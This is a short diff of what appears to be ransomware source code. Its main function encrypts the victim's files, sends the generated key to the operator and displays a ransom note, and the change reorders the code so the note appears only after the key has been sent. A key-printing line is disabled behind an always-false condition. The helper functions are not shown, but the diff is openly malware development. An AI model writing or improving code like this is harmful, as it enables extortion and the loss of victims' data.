@@ -9,9 +9,9 @@ def main():
     search_and_encrypt_files(encryption_key)
     
     your_id=make_id()
-    create_and_display_ransom_note(your_id)
     send_key(f"{your_id} : {encryption_key.decode()}")
-    
+    create_and_display_ransom_note(your_id)
+
     if 1==0:
         print(f"생성된 key : {encryption_key.decode()}")
     exit(0)
